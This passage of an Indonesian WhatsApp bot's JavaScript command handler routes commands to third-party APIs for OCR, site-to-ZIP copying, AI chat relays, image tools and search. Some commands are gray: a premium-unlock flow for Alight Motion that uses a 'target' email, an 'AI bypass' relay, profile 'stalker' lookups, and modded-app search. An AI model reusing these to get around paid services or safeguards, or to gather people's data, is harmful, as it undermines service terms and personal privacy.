      )
    }
  }
  break

  case "amsend": {
    try {
      const email = text?.trim()

      if (!email) {
        return xreply(
          example("user@gmail.com")
        )
      }

      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        return xreply(
          "❌ Format email tidak valid.\n\n" +
          example("user@gmail.com")
        )
      }

      await xreply(
        "🔐 *AM PREMIUM V2*\n\n" +
        "📨 Step 1: Mengirim verification link...\n" +
        "⏳ Mohon tunggu..."
      )

      const sendRes = await axios.get(
        "https://v2.api-varhad.my.id/tools/amprem/verif/email",
        {
          params: { email: email },
          headers: { "Accept": "application/json" },
          timeout: 60000
        }
      )

      const sendData = sendRes.data

      console.log(
        "AMPREM V2 SEND:",
        JSON.stringify(sendData, null, 2)
      )

      if (!sendData?.status || !sendData?.result?.success) {
        return xreply(
          "❌ Gagal mengirim verification link.\n" +
          `Pesan: ${sendData?.result?.message || "Unknown error"}`
        )
      }

      await xreply(
        "✅ Link berhasil dikirim ke email.\n\n" +
        "⚠️ *Langkah selanjutnya:*\n" +
        "1. Buka email target (inbox/spam)\n" +
        "2. Klik link verifikasi dari Alight Motion\n" +
        "3. Copy URL di address bar setelah redirect\n" +
        "4. Jalankan perintah:\n" +
        example(`${prefix}amverif2 ${email}|LINK_YANG_SUDAH_DICOPY`)
      )

    } catch (err) {
      console.error(
        "AMPREM V2 ERROR:",
        err?.response?.data || err
      )

      const errorData =
        err?.response?.data

      return xreply(
        "❌ Terjadi kesalahan.\n\n" +
        (
          errorData
            ? JSON.stringify(errorData, null, 2)
            : err.message
        )
      )
    }
  }
  break

  /// ───────────── [ 𝖨𝗆𝖺𝗀𝖾 & 𝖮𝖢𝖱 𝖳𝗈𝗈𝗅𝗌 ] ──────────── ///
  case "ocr": {
    const fs = require("fs")
    const { ImageUploadService } = require("node-upload-images")

    let media

    try {
      const qmsg = m.quoted ? m.quoted : m
      const mime = qmsg?.mime || ""

      if (!/image\/(jpe?g|png|webp)/i.test(mime)) {
        return xreply(
          example("dengan reply foto")
        )
      }

      await xreply("⏳ Sedang membaca teks dari foto...")

      media = await client.downloadAndSaveMediaMessage(qmsg)

      if (!media || !fs.existsSync(media)) {
        return xreply("❌ Gagal mengambil foto.")
      }

      const service = new ImageUploadService("pixhost.to")

      const upload = await service.uploadFromBinary(
        fs.readFileSync(media),
        "MISTER-MD-md.png"
      )

      const imageUrl = upload?.directLink?.toString()

      if (!imageUrl) {
        return xreply(
          "❌ Gagal mendapatkan URL Pixhost."
        )
      }

      console.log("OCR PIXHOST URL:", imageUrl)

      const apiUrl =
        "https://api.nexray.eu.cc/tools/ocr?url=" +
        encodeURIComponent(imageUrl)

      const response = await axios.get(apiUrl, {
        timeout: 120000
      })

      const data = response.data

      console.log(
        "OCR RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result) {
        return xreply(
          "❌ API OCR tidak memberikan hasil."
        )
      }

      const result = data.result
      const hasilText = result.text?.trim()

      if (!hasilText) {
        return xreply(
          "❌ Tidak ada teks yang berhasil ditemukan di foto."
        )
      }

      await xreply(
        `🔎 *OCR IMAGE*\n` +
        `━━━━━━━━━━━━━━━━━━\n\n` +
        `${hasilText}\n\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `📷 *Source:* Pixhost\n`
      )

    } catch (err) {
      console.error(
        "OCR ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ OCR gagal diproses.\n\n" +
        "Kemungkinan penyebab:\n" +
        "• Upload Pixhost gagal\n" +
        "• Foto tidak dapat dibaca\n" +
        "• API OCR sedang bermasalah\n" +
        "• Request timeout"
      )

    } finally {
      try {
        if (media && fs.existsSync(media)) {
          fs.unlinkSync(media)
        }
      } catch (e) {
        console.error("Gagal menghapus file temporary:", e)
      }
    }
  }
  break

  /// ───────────── [ 𝖶𝖾𝖻𝗌𝗂𝗍𝖾 𝖳𝗈𝗈𝗅𝗌 ] ──────────── ///
  case "webtozip": {
    try {
      const url = text?.trim()

      if (!url) {
        return xreply(
          example("https://www.rafaofficial.my.id/index.html")
        )
      }

      if (!/^https?:\/\//i.test(url)) {
        return xreply(
          "❌ URL tidak valid.\nGunakan URL yang diawali http:// atau https://"
        )
      }

      await xreply("⏳ Sedang mengubah website menjadi ZIP...")

      const apiUrl =
        "https://api.nexray.eu.cc/tools/webtozip?url=" +
        encodeURIComponent(url)

      const response = await axios.get(apiUrl, {
        timeout: 180000
      })

      const data = response.data

      console.log(
        "WEBTOZIP RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result) {
        return xreply(
          "❌ Gagal membuat ZIP dari website."
        )
      }

      const result = data.result

      if (result.error?.code !== "-" || !result.downloadUrl) {
        return xreply(
          "❌ Website gagal diproses.\n" +
          `Error: ${result.error?.text || "Tidak diketahui"}`
        )
      }

      const teks =
        `✅ *WEBSITE BERHASIL DI-ZIP*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🌐 URL: ${result.url || url}\n` +
        `📁 File disalin: *${result.copiedFilesAmount ?? 0}*\n` +
        `📦 Download ZIP:\n${result.downloadUrl}\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🤖 Source: MISTER-MD`

      await xreply(teks)

    } catch (err) {
      console.error(
        "WEBTOZIP ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mengubah website menjadi ZIP.\n" +
        "Website mungkin tidak dapat diakses atau proses API timeout."
      )
    }
  }
  break

  /// ───────────── [ 𝖠𝖨 𝖢𝗁𝖺𝗍 ] ──────────── ///
  case "bypass": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("hallo")
        )
      }

      await xreply("🤖 Sedang memproses...")

      const apiUrl =
        "https://api.nexray.eu.cc/ai/bypass?text=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 120000
      })

      const data = response.data

      console.log(
        "BYPASS RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result) {
        return xreply(
          "❌ AI Bypass tidak memberikan jawaban."
        )
      }

      await xreply(
        "🤖 *AI BYPASS*\n\n" +
        data.result
      )

    } catch (err) {
      console.error(
        "BYPASS ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal menghubungi AI Bypass.\n" +
        "Coba lagi beberapa saat."
      )
    }
  }
  break

  case "claude": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("halo apa kabar")
        )
      }

      await xreply("🤖 Claude sedang berpikir...")

      const apiUrl =
        "https://api.nexray.eu.cc/ai/claude?text=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 120000
      })

      const data = response.data

      console.log(
        "CLAUDE RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result) {
        return xreply(
          "❌ Claude tidak memberikan jawaban."
        )
      }

      await xreply(
        "🤖 *CLAUDE AI*\n\n" +
        data.result
      )

    } catch (err) {
      console.error(
        "CLAUDE ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal menghubungi Claude AI.\n" +
        "Coba lagi beberapa saat."
      )
    }
  }
  break

  case "gptai": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("siapa Thomas Alva Edison?")
        )
      }

      await xreply("🤖 Sedang berpikir...")

      const apiUrl =
        "https://api.azbry.com/api/ai/gpt4o?q=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 120000
      })

      const data = response.data

      if (!data?.status || !data?.result?.answer) {
        console.log("GPT4O RESPONSE:", data)
        return xreply(
          "❌ GPT-4o tidak memberikan jawaban."
        )
      }

      const answer = data.result.answer

      await xreply(
        "🤖 *GPT-4o*\n\n" +
        answer
      )

    } catch (err) {
      console.error(
        "GPT4O ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal menghubungi GPT-4o.\n" +
        "Coba lagi beberapa saat."
      )
    }
  }
  break

  /// ───────────── [ 𝖲𝗍𝖺𝗅𝗄𝖾𝗋 ] ──────────── ///
  case "ff": {
    try {
      const uid = text?.trim()

      if (!uid) {
        return xreply(
          example("123456789")
        )
      }

      if (!/^\d+$/.test(uid)) {
        return xreply(
          "❌ UID Free Fire hanya boleh berisi angka."
        )
      }

      await xreply("🔎 Sedang mengambil data akun Free Fire...")

      const apiUrl =
        "https://api.nexray.eu.cc/stalker/freefire?uid=" +
        encodeURIComponent(uid)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "FREEFIRE RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !data?.result) {
        return xreply(
          "❌ Data akun Free Fire tidak ditemukan."
        )
      }

      const ff = data.result

      let teks =
        `🎮 *FREE FIRE STALKER*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🆔 UID: *${ff.uid || uid}*\n` +
        `👤 Name: *${ff.name || "-"}*\n` +
        `⭐ Level: *${ff.level ?? "-"}*\n` +
        `✨ EXP: *${ff.exp ?? "-"}*\n` +
        `🌍 Region: *${ff.region || "-"}*\n` +
        `❤️ Likes: *${ff.likes || "0"}*\n` +
        `🏆 Prime Level: *${ff.prime_level ?? "-"}*\n` +
        `👑 Honor Score: *${ff.honor_score ?? "-"}*\n` +
        `🎖️ Title: *${ff.title ?? "-"}*\n` +
        `✍️ Signature: *${ff.signature ?? "-"}*\n` +
        `🔥 Fire Pass: *${ff.fire_pass ?? "-"}*\n` +
        `🎯 BP Badges: *${ff.bp_badges ?? "-"}*\n` +
        `🏅 BR Rank: *${ff.br_rank ?? "-"}*\n` +
        `🎮 CS Points: *${ff.cs_points ?? "-"}*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 Author: ${global.botname}`

      await xreply(teks)

    } catch (err) {
      console.error(
        "FREEFIRE ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mengambil data Free Fire.\n" +
        "Pastikan UID benar atau API sedang tidak bermasalah."
      )
    }
  }
  break

  case "steam":
  case "steamstalk": {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.steam bola`);
      }

      const axios = require('axios');

      let { data } = await axios.get(
        `https://api.synoxcloud.xyz/stalker/steam?username=${encodeURIComponent(text)}`
      );

      if (!data.status) {
        return xreply('Username Steam tidak ditemukan');
      }

      let res = data.result;

      let caption = `🎮 *S T E A M - S T A L K E R*

👤 Username : ${res.username || '-'}
🏷️ Display Name : ${res.display_name || '-'}
📛 Real Name : ${res.real_name || '-'}
📡 Status : ${res.status || '-'}
📍 Location : ${res.location || '-'}
⭐ Level : ${res.level || 0}
🏅 Badges : ${res.badges || 0}
🎲 Games Owned : ${res.games_owned || 0}
📅 Member Since : ${res.member_since || '-'}
👤 Profile : ${res.profile_url || '-'}`;

      if (res.recent_games && res.recent_games.length) {
        caption += `\n\n🕹️ Recent Games:\n`;

        for (let game of res.recent_games.slice(0, 10)) {
          caption += `• ${game.name || game}\n`;
        }
      }

      if (res.avatar) {
        await client.sendMessage(
          m.chat,
          {
            image: { url: res.avatar },
            caption
          },
          { quoted: m }
        );
      } else {
        await xreply(caption);
      }

    } catch (e) {
      console.error(e);
      xreply(`Terjadi kesalahan:\n${e.message}`);
    }
  }
  break

  case 'stalktele':
  case 'stalktelegram': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.stalktele MISTER-MD`);
      }

      const axios = require('axios');

      let { data } = await axios.get(
        `https://api.synoxcloud.xyz/stalker/telegram?username=${encodeURIComponent(text.replace('@', ''))}`
      );

      if (!data.status) {
        return xreply('Username Telegram tidak ditemukan');
      }

      let res = data.result;

      let caption = `🔍 *TELEGRAM STALKER*\n\n`;
      caption += `👤 *Nama* : ${res.name || '-'}\n`;
      caption += `📛 *Username* : ${res.username || '-'}\n`;
      caption += `📝 *Bio* : ${res.bio || '-'}\n`;
      caption += `🏷️ *Tipe* : ${res.type || '-'}\n`;
      caption += `👥 *Subscribers* : ${res.subscribers || '0'}\n`;
      caption += `🔗 *Profile* : ${res.profile_url || '-'}\n`;
      caption += `📌 *Extra* : ${res.extra || '-'}\n`;

      await client.sendMessage(
        m.chat,
        {
          image: { url: res.photo },
          caption
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal mengambil data Telegram');
    }
  }
  break

  /// ───────────── [ 𝖲𝖾𝖺𝗋𝖼𝗁 ] ──────────── ///
  case "wikipedia": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("javascript")
        )
      }

      await xreply("🔎 Sedang mencari di Wikipedia...")

      const apiUrl =
        "https://api.nexray.eu.cc/search/wikipedia?q=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "WIKIPEDIA RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !Array.isArray(data?.result)) {
        return xreply(
          "❌ API Wikipedia tidak memberikan hasil yang valid."
        )
      }

      const results = data.result

      if (results.length === 0) {
        return xreply(
          `❌ Tidak ditemukan hasil Wikipedia untuk: *${query}*`
        )
      }

      let teks =
        `🔎 *WIKIPEDIA SEARCH*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🔍 Query: *${query}*\n` +
        `📊 Ditemukan: *${results.length}*\n\n`

      results.slice(0, 10).forEach((item, index) => {
        const snippet = String(item.snippet || "Tidak ada ringkasan")
          .replace(/<[^>]*>/g, "")
          .replace(/&quot;/g, '"')
          .replace(/&#39;/g, "'")
          .replace(/&amp;/g, "&")
          .replace(/&lt;/g, "<")
          .replace(/&gt;/g, ">")

        teks +=
          `*${index + 1}. ${item.title || "Tanpa Judul"}*\n` +
          `🆔 Page ID: ${item.pageid ?? "-"}\n` +
          `📦 Size: ${item.size ?? "-"}\n` +
          `📝 Words: ${item.wordcount ?? "-"}\n` +
          `📖 ${snippet}\n` +
          `🕒 ${item.timestamp || "-"}\n\n`
      })

      teks +=
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 Author: ${global.botname}`

      await xreply(teks)

    } catch (err) {
      console.error(
        "WIKIPEDIA ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mencari Wikipedia.\n" +
        "API mungkin sedang error atau timeout."
      )
    }
  }
  break

  case "groupsor": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("cari teman")
        )
      }

      await xreply("🔎 Sedang mencari grup...")

      const apiUrl =
        "https://api.nexray.eu.cc/search/groupsor?q=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "GROUPSOR RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !Array.isArray(data?.result)) {
        return xreply(
          "❌ API tidak memberikan hasil yang valid."
        )
      }

      const results = data.result

      if (results.length === 0) {
        return xreply(
          `❌ Tidak ditemukan grup untuk: *${query}*`
        )
      }

      let teks =
        `🔎 *SEARCH GROUP*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🔍 Query: *${query}*\n` +
        `📊 Ditemukan: *${results.length}*\n\n`

      results.slice(0, 10).forEach((group, index) => {
        teks +=
          `*${index + 1}. ${group.name || "Tanpa Nama"}*\n` +
          `📝 ${group.description || "Tidak ada deskripsi"}\n` +
          `📂 Kategori: ${group.category || "-"}\n` +
          `🌍 Negara: ${group.country || "-"}\n` +
          `🔗 ${group.url || "-"}\n\n`
      })

      teks +=
        `━━━━━━━━━━━━━━━━━━\n` +
        `MISTER-MD`

      await xreply(teks)

    } catch (err) {
      console.error(
        "GROUPSOR ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mencari grup.\n" +
        "API mungkin sedang error atau timeout."
      )
    }
  }
  break

  case "happymood": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("dana")
        )
      }

      await xreply("🔎 Sedang mencari aplikasi...")

      const apiUrl =
        "https://api.nexray.eu.cc/search/happymood?q=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "HAPPYMOOD RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !Array.isArray(data?.result)) {
        return xreply(
          "❌ API tidak memberikan hasil yang valid."
        )
      }

      const results = data.result

      if (results.length === 0) {
        return xreply(
          `❌ Tidak ditemukan aplikasi untuk: *${query}*`
        )
      }

      let teks =
        `🔎 *HAPPYMOOD SEARCH*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🔍 Query: *${query}*\n` +
        `📊 Ditemukan: *${results.length}*\n\n`

      results.slice(0, 10).forEach((app, index) => {
        teks +=
          `*${index + 1}. ${app.title || "Unknown"}*\n` +
          `📱 Versi: ${app.version || "-"}\n` +
          `📦 Ukuran: ${app.size || "-"}\n` +
          `🛠️ Mod: ${app.mod_status || "Tidak ada"}\n` +
          `🔗 URL: ${app.url || "-"}\n\n`
      })

      teks +=
        `━━━━━━━━━━━━━━━━━━\n` +
        `MISTER-MD`

      await xreply(teks)

    } catch (err) {
      console.error(
        "HAPPYMOOD ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mencari aplikasi.\n" +
        "API mungkin sedang error atau timeout."
      )
    }
  }
  break

  case "github": {
    try {
      const query = text?.trim()

      if (!query) {
        return xreply(
          example("MISTER-MD")
        )
      }

      await xreply("🔎 Sedang mencari di GitHub...")

      const apiUrl =
        "https://api.nexray.eu.cc/search/github?q=" +
        encodeURIComponent(query)

      const response = await axios.get(apiUrl, {
        timeout: 60000
      })

      const data = response.data

      console.log(
        "GITHUB RESPONSE:",
        JSON.stringify(data, null, 2)
      )

      if (!data?.status || !Array.isArray(data?.result)) {
        return xreply(
          "❌ API GitHub tidak memberikan hasil yang valid."
        )
      }

      const results = data.result

      if (results.length === 0) {
        return xreply(
          `❌ Tidak ditemukan hasil untuk *${query}*.`
        )
      }

      let teks =
        `🔎 *GITHUB SEARCH*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `🔍 Query: *${query}*\n` +
        `📊 Hasil: *${results.length}*\n\n`

      results.slice(0, 10).forEach((item, index) => {
        const file = item.file || {}
        const repo = item.repository || {}

        teks +=
          `*${index + 1}. ${repo.full_name || repo.name || "Unknown Repository"}*\n` +
          `📄 File: ${file.name || "Unknown"}\n` +
          `📁 Path: ${file.path || "-"}\n` +
          `📝 ${repo.description || "Tidak ada deskripsi"}\n` +
          `⭐ Stars: ${repo.stars ?? 0}\n` +
          `🍴 Forks: ${repo.forks ?? 0}\n` +
          `⚠️ Issues: ${repo.issues ?? 0}\n` +
          `💻 Language: ${repo.language || "Tidak diketahui"}\n` +
          `🔗 ${repo.url || file.url || "-"}\n` +
          `📦 Raw: ${file.raw_url || "-"}\n\n`
      })

      teks +=
        `━━━━━━━━━━━━━━━━━━\n` +
        `👤 Author: ${global.botname}`

      await xreply(teks)

    } catch (err) {
      console.error(
        "GITHUB ERROR:",
        err?.response?.data || err
      )

      return xreply(
        "❌ Gagal mencari GitHub.\n" +
        "Coba lagi beberapa saat."
      )
    }
  }
  break

  case 'playstore2': {
    try {
      if (!text) {
        return xreply(`Contoh penggunaan:

.playstore mobile legend`);
      }

      const axios = require('axios');

      let { data } = await axios.get(
        `https://api.synoxcloud.xyz/search/playstore?q=${encodeURIComponent(text)}`
      );

      if (!data.status || !data.data?.length) {
        return xreply('Aplikasi tidak ditemukan');
      }

      let result = data.data.slice(0, 10);

      let caption = `📱 *PLAYSTORE SEARCH*

🔎 Keyword : ${text}
📦 Total : ${data.total}

`;

      result.forEach((app, i) => {
        caption += `${i + 1}. *${app.name}*
👤 Developer : ${app.developer}
⭐ Rating : ${app.rating_text}
🔗 Link : ${app.url}

`;
      });

      await client.sendMessage(
        m.chat,
        {
          image: { url: result[0].image },
          caption
        },
        { quoted: m }
      );

    } catch (e) {
      console.error(e);
      xreply('Gagal mencari aplikasi PlayStore');
    }
  }
  break

  case 'playstore': {
    if (!text) return xreply(`${prefix + command} WhatsApp`)
    xreply('Proses..')
    await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
      let response = await res.json()
      let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
      for (let i of response.result) {
        teks += `*◦ Title :* ${i.nama}\n`
        teks += `*◦ Developer :* ${i.developer}\n`
        teks += `*◦ Rating :* ${i.rate}\n`
        teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
        teks += `*◦ Link Apps Url :* ${i.link}\n\n`
      }
      xreply(teks)
    }).catch(err => xreply('Error 🗿'))
  }
  break

  /// ───────────── [ 𝖱𝖺𝗇𝖽𝗈𝗆 𝖨𝗆𝖺𝗀𝖾 ] ──────────── ///
  case "pap": {
    try {
      await xreply("⏳ Mengambil foto random...")

      const response = await axios.get(
        "https://api.nexadev.my.id/api/random/pap",
        {
          responseType: "arraybuffer",
          timeout: 60000
        }
      )

      const contentType = response.headers["content-type"] || ""

      if (!contentType.includes("image")) {
        return xreply("❌ API tidak mengembalikan gambar.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption: "📸 Random PAP"
        },
        { quoted: m }
      )

    } catch (err) {
      console.error("PAP ERROR:", err)
      xreply("❌ Gagal mengambil random PAP.")
    }
  }
  break

  case "anime": {
    try {
      await xreply("⏳ Mengambil gambar anime random...")

      const response = await axios.get(
        "https://api.nexadev.my.id/api/random/anime",
        {
          responseType: "arraybuffer",
          timeout: 60000
        }
      )

      const contentType = response.headers["content-type"] || ""

      if (!contentType.includes("image")) {
        return xreply("❌ API tidak mengembalikan gambar.")
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption: "🌸 Random Anime"
        },
        { quoted: m }
      )

    } catch (err) {
      console.error("ANIME ERROR:", err)
      xreply("❌ Gagal mengambil gambar anime random.")
    }
  }
  break

  /// ───────────── [ 𝖨𝗆𝖺𝗀𝖾 𝖠𝖨 ] ──────────── ///
  case "imageai":
  case "aiimg": {
    try {
      if (!text) {
        return xreply(
          `Contoh:\n${prefix}zimage anime keren di kota malam`
        )
      }

      const axios = require("axios")

      await xreply(
        `
⏳ Sedang membuat gambar...`
      )

      const response = await axios.get(
        "https://bintangapi.my.id/api/aiimg/zimage",
        {
          params: {
            prompt: text
          },
          responseType: "arraybuffer",
          timeout: 180000,

          transformResponse: [
            data => data
          ],

          validateStatus: () => true
        }
      )

      console.log("ZIMAGE STATUS:", response.status)
      console.log(
        "ZIMAGE TYPE:",
        response.headers["content-type"]
      )
      console.log(
        "ZIMAGE LENGTH:",
        response.data?.length
      )

      if (response.status < 200 || response.status >= 300) {
        let errText

        try {
          errText =
            Buffer
              .from(response.data)
              .toString("utf8")
        } catch {
          errText =
            `HTTP ${response.status}`
        }

        return xreply(
          `❌ *ZIMAGE API ERROR*

HTTP:
${response.status}

${errText.substring(0, 1000)}`
        )
      }

      const imageBuffer =
        Buffer.from(response.data)

      if (!imageBuffer.length) {
        return xreply(
          "❌ Response gambar kosong."
        )
      }

      const contentType =
        response.headers["content-type"] || ""

      console.log(
        "ZIMAGE BUFFER:",
        imageBuffer.length
      )

      if (
        !contentType.includes("image")
      ) {
        const result =
          imageBuffer.toString("utf8")

        console.log(
          "ZIMAGE NON-IMAGE RESPONSE:",
          result
        )

        return xreply(
          `❌ *API TIDAK MENGEMBALIKAN GAMBAR*

Content-Type:
${contentType}

Response:
${result.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: imageBuffer,

          caption:
            `✨ *IMAGE AI BERHASIL*

📝 Prompt:
${text}

📦 Size:
${(imageBuffer.length / 1024).toFixed(2)} KB

MISTER-MD`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log(
        "ZIMAGE ERROR:",
        e
      )

      return xreply(
        `❌ *ZIMAGE ERROR*

${e.message || e}`
      )
    }
  }
  break

  /// ───────────── [ 𝖴𝗉𝗌𝖼𝖺𝗅𝖾 𝖨𝗆𝖺𝗀𝖾 ] ──────────── ///
  case "upscale2": {
    try {
      if (!/image/.test(mime)) {
        return xreply(
          `❌ *REPLY FOTO TERLEBIH DAHULU*

Contoh:
Reply foto lalu ketik:
${prefix}upscale2`
        )
      }

      await xreply("⏳ Mengupload foto ke Pixhost...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      if (!media || !fs.existsSync(media)) {
        return xreply("❌ Gagal mengambil foto.")
      }

      const { ImageUploadService } = require("node-upload-images")

      const service = new ImageUploadService("pixhost.to")

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "upscale2.png"
      )

      fs.unlinkSync(media)

      if (!directLink) {
        return xreply("❌ Gagal mendapatkan URL Pixhost.")
      }

      const imageUrl = directLink.toString()

      await xreply("⏳ Sedang memproses Upscale 2X...")

      const apiUrl =
        `https://api.nexray.eu.cc/tools/v4/upscale?url=${encodeURIComponent(imageUrl)}&resolusi=2`

      const response = await axios.get(apiUrl, {
        responseType: "arraybuffer",
        timeout: 180000,
        headers: {
          "User-Agent": "Mozilla/5.0",
          "Accept": "image/*"
        },
        maxContentLength: 50 * 1024 * 1024,
        maxBodyLength: 50 * 1024 * 1024
      })

      if (!response.data || !response.data.length) {
        return xreply(
          "❌ API tidak mengembalikan gambar."
        )
      }

      const contentType =
        response.headers["content-type"] || ""

      if (!contentType.includes("image")) {
        let errorText = ""

        try {
          errorText = Buffer
            .from(response.data)
            .toString("utf8")
        } catch {
          errorText = "Response API bukan gambar."
        }

        return xreply(
          `❌ *UPSCALE 2X GAGAL*

${errorText.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption:
            `✨ *IMAGE UPSCALE 2X*

✅ Berhasil meningkatkan kualitas foto.
`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log("UPSCALE2 ERROR:", e)

      return xreply(
        `❌ *UPSCALE 2X ERROR*

${e.response?.data?.message ||
        e.response?.data?.msg ||
        e.message ||
        "Terjadi kesalahan tidak diketahui."}`
      )
    }
  }
  break

  case "upscale3": {
    try {
      if (!/image/.test(mime)) {
        return xreply(
          `❌ *REPLY FOTO TERLEBIH DAHULU*

Contoh:
Reply foto lalu ketik:
${prefix}upscale4`
        )
      }

      await xreply("⏳ Mengupload foto ke Pixhost...")

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      if (!media || !fs.existsSync(media)) {
        return xreply("❌ Gagal mengambil foto.")
      }

      const { ImageUploadService } = require("node-upload-images")

      const service = new ImageUploadService("pixhost.to")

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        "upscale4.png"
      )

      fs.unlinkSync(media)

      if (!directLink) {
        return xreply("❌ Gagal mendapatkan URL Pixhost.")
      }

      const imageUrl = directLink.toString()

      await xreply("⏳ Sedang memproses Upscale 4X...")

      const apiUrl =
        `https://api.nexray.eu.cc/tools/v4/upscale?url=${encodeURIComponent(imageUrl)}&resolusi=4`

      const response = await axios.get(apiUrl, {
        responseType: "arraybuffer",
        timeout: 240000,
        headers: {
          "User-Agent": "Mozilla/5.0",
          "Accept": "image/*"
        },
        maxContentLength: 80 * 1024 * 1024,
        maxBodyLength: 80 * 1024 * 1024
      })

      if (!response.data || !response.data.length) {
        return xreply(
          "❌ API tidak mengembalikan gambar."
        )
      }

      const contentType =
        response.headers["content-type"] || ""

      if (!contentType.includes("image")) {
        let errorText = ""

        try {
          errorText = Buffer
            .from(response.data)
            .toString("utf8")
        } catch {
          errorText = "Response API bukan gambar."
        }

        return xreply(
          `❌ *UPSCALE 4X GAGAL*

${errorText.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption:
            `🔥 *IMAGE UPSCALE 4X*

✅ Berhasil meningkatkan kualitas foto.
`
        },
        {
          quoted: m
        }
      )

    } catch (e) {
      console.log("UPSCALE4 ERROR:", e)

      return xreply(
        `❌ *UPSCALE 4X ERROR*

${e.response?.data?.message ||
        e.response?.data?.msg ||
        e.message ||
        "Terjadi kesalahan tidak diketahui."}`
      )
    }
  }
  break

  case "upscale": {
    try {
      if (!/image/.test(mime)) {
        return xreply(
          `❌ Reply/kirim foto terlebih dahulu

Contoh:
${prefix}upscale`
        )
      }

      await xreply('⏳ Mengupload foto...')

      let media = await client.downloadAndSaveMediaMessage(qmsg)

      if (!media || !fs.existsSync(media)) {
        return xreply('❌ Gagal mengambil foto')
      }

      const { ImageUploadService } = require('node-upload-images')

      const service = new ImageUploadService('pixhost.to')

      let { directLink } = await service.uploadFromBinary(
        fs.readFileSync(media),
        'upscale.png'
      )

      fs.unlinkSync(media)

      if (!directLink) {
        return xreply('❌ Gagal mendapatkan URL Pixhost')
      }

      const imageUrl = directLink.toString()

      await xreply('⏳ Sedang meningkatkan kualitas foto...')

      const apiUrl =
        `https://api.nexray.eu.cc/tools/v1/upscale?url=${encodeURIComponent(imageUrl)}`

      const response = await axios.get(apiUrl, {
        responseType: 'arraybuffer',
        timeout: 120000,
        headers: {
          'User-Agent': 'Mozilla/5.0',
          'Accept': 'image/*'
        },
        maxContentLength: 30 * 1024 * 1024,
        maxBodyLength: 30 * 1024 * 1024
      })

      if (!response.data || !response.data.length) {
        return xreply(
          '❌ API Upscale tidak mengembalikan gambar.'
        )
      }

      const contentType =
        response.headers['content-type'] || ''

      if (!contentType.includes('image')) {
        let errorText = ''

        try {
          errorText = Buffer
            .from(response.data)
            .toString('utf8')
        } catch {
          errorText = 'Response API bukan gambar.'
        }

        return xreply(
          `❌ *UPSCALE GAGAL*

${errorText.substring(0, 1000)}`
        )
      }

      await client.sendMessage(
        m.chat,
        {
          image: Buffer.from(response.data),
          caption:
            `✨ *IMAGE UPSCALE*

